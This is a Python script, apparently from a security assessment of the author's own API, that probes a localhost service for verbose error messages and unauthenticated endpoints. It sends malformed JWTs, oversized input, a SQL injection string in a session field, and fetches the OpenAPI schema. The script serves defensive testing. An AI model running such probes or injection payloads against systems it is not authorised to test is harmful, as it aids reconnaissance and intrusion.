"""
attack_03_error_leakage.py
==========================
Triggers error conditions to extract internal system information
from verbose error responses.

Run: python security_assessment/attacks/attack_03_error_leakage.py
"""

import json
import httpx

BASE_URL = "http://localhost:8000"


def print_finding(label: str, status: int, body: str):
    print(f"\n[{label}]")
    print(f"  HTTP {status}")
    print(f"  Response: {body[:500]}")


def run():
    print("=" * 60)
    print("ATTACK 03 — Error Message Leakage & Info Disclosure")
    print("=" * 60)

    # --- 1. Unauthenticated request — reveals auth scheme ---
    print("\n[1] Probing auth error messages...")
    resp = httpx.post(f"{BASE_URL}/api/v1/auth/token",
                      data={"username": "nonexistent@test.com", "password": "wrong"})
    print_finding("Invalid credentials", resp.status_code, resp.text)

    # --- 2. Malformed token — reveals JWT library details ---
    print("\n[2] Sending malformed JWT...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/query",
        headers={"Authorization": "Bearer not.a.valid.jwt.token"},
        json={"query": "test"},
    )
    print_finding("Malformed JWT", resp.status_code, resp.text)

    # --- 3. Expired/truncated token ---
    print("\n[3] Sending truncated token...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/query",
        headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.e30"},
        json={"query": "test"},
    )
    print_finding("Truncated token", resp.status_code, resp.text)

    # --- 4. Wrong content-type on ingest — reveals expected format ---
    print("\n[4] Sending wrong content-type to ingest...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/ingest",
        headers={"Authorization": "Bearer faketoken", "Content-Type": "application/json"},
        content=b'{"file": "test"}',
    )
    print_finding("Wrong content-type on ingest", resp.status_code, resp.text)

    # --- 5. Oversized query — reveals validation limits ---
    print("\n[5] Sending oversized query (>2000 chars)...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/query",
        headers={"Authorization": "Bearer faketoken"},
        json={"query": "A" * 2001},
    )
    print_finding("Oversized query", resp.status_code, resp.text)

    # --- 6. Invalid session_id format ---
    print("\n[6] Sending invalid session_id format...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/query",
        headers={"Authorization": "Bearer faketoken"},
        json={"query": "test", "session_id": "' OR 1=1 --"},
    )
    print_finding("SQL injection in session_id", resp.status_code, resp.text)

    # --- 7. Health endpoint — confirms server is running, reveals status ---
    print("\n[7] Health check (no auth required)...")
    resp = httpx.get(f"{BASE_URL}/health")
    print_finding("Health endpoint", resp.status_code, resp.text)

    # --- 8. OpenAPI schema — full API surface exposed ---
    print("\n[8] Fetching OpenAPI schema (no auth required)...")
    resp = httpx.get(f"{BASE_URL}/openapi.json")
    if resp.status_code == 200:
        schema = resp.json()
        paths = list(schema.get("paths", {}).keys())
        print(f"\n  ⚠️  Full API schema exposed without authentication!")
        print(f"  Endpoints discovered: {paths}")
    else:
        print_finding("OpenAPI schema", resp.status_code, resp.text)

    print("\n" + "=" * 60)
    print("KEY FINDINGS:")
    print("  - Error messages reveal internal details (JWT library, validation rules)")
    print("  - OpenAPI docs exposed at /openapi.json and /docs with no auth")
    print("  - Health endpoint confirms server presence with no auth")
    print("=" * 60)


if __name__ == "__main__":
    run()
